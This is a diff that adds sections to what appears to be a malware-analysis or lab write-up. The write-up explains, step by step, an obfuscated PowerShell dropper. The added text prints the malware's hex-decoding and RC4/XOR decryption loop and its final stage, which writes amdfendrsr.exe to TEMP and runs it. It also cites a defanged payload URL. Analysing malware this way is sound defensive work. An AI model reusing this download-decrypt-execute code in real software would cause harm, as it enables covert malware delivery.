@@ -111,6 +111,8 @@ This piece of script is defining variable $k and using this UTF8 encoding functi
 This piece of code is defining variable **$h** and again by using functions that manipulate strings to obfuscate the true value being assigned to this variable.  
   
 A quick rundown is that **join()** will concatinate the individual strings, and **replace()** will delete any whitespace because **\s** is the RegEx for whitespace and it's replacing those with '' which is a blank string.  
+
+This is downloading the payload from **hxxp://api-edgecloud[.]xyz/amd[.]bin**  (NOTE: This is a defanged URL in order to protect people reading this report from inadvertantly going to the infected URL)
   
 >$b = for($x=0; $x -lt $h.Length; $x+=2) { [Convert]::ToByte($h.Substring($x, 2), 16) }
   
@@ -123,7 +125,43 @@ I'm going to reformat this portion of code to make it more readable.
 >    }
 >````
 
-This is a simple code block that is converting every two hex characters into a byte. 
+This is a simple code block that is converting every two hex characters into a byte.  
+A quick breakdown is that $x is initialized at 0 and as long as $x is less than (the -lt) the length of variable $h it will execute the code inside the {} and then add 2 to $x.  
+The code inside the loop statement is extracting the portion of $h from $x to $x+2 base 16 into a byte and adds it to the array $b.  
+  
+>$s = 0..255 $j = 0 for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp } $i = $j = 0 $d = foreach ($byte in $b) { $i = ($i + 1) % 256 $j = ($j + $s[$i]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp $byte -bxor $s[($s[$i] + $s[$j]) % 256] }
+  
+Let's reformat this into something more readable than a long string of characters.  
+
+>````
+>    $s = 0..255
+>    $j = 0
+>    for ($i = 0; $i -lt 256; $i++) {
+>        $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256
+>        $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
+>    }
+>    $i = $j = 0
+>    $d = foreach ($byte in $b) {
+>        $i = ($i + 1) % 256
+>        $j = ($j + $s[$i]) % 256
+>        $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
+>        $byte -bxor $s[($s[$i] + $s[$j]) % 256]
+>    }
+>````
+  This is taking the key we found earlier and convert it into a pseudo-randomized 256-byte vector that is used to encrypt and decrypt a payload. This is known as the RC4 Key-Scheduling Algorithm (KSA)  
+  We will take note of this because we will likely use this in Cyberchef later to help us decrypt payloads we find in the packet capture. One more note is that XOR is being used against the payload.
+
+>````
+>    $p = $env:TEMP + '\amdfendrsr.exe'
+>    [System.IO.File]::WriteAllBytes($p, $d)
+>    Start-Process $p
+>````
+
+Finally this takes the decrypted payload and saves it to the TEMP directory as amdfendrsr.exe and executes it.  
+
+
+
+
 
 
 ## Phases
